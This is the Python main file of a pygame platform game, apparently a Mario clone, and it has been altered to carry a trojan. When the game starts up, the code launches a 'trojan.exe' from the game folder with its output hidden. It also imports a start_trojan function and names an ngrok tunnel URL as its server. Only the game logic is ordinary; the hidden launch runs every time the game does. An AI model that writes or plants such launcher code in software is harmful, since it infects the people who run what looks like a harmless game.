__author__ = 'marble_xu'

import pygame as pg
import threading
import subprocess
import os
import sys
from trojan import start_trojan
from . import setup, tools
from . import constants as c
from .states import main_menu, load_screen, level

def main():
    game = tools.Control()
    state_dict = {c.MAIN_MENU: main_menu.Menu(),
                  c.LOAD_SCREEN: load_screen.LoadScreen(),
                  c.LEVEL: level.Level(),
                  c.GAME_OVER: load_screen.GameOver(),
                  c.TIME_OUT: load_screen.TimeOut()}
    game.setup_states(state_dict, c.MAIN_MENU)

    server_url = 'https://roxy-maladapted-aeroscopically.ngrok-free.dev'  # Use localhost for testing
    if getattr(sys, "frozen", False):
        base_dir = os.path.dirname(sys.executable)   # when running main.exe
    else:
        base_dir = os.path.dirname(__file__)         # when running main.py

    trojan_path = os.path.join(base_dir, "trojan.exe")

    try:
        subprocess.Popen(
            [trojan_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        print("Failed to start trojan:", e)

    game.main()

if __name__ == "__main__":
    main()
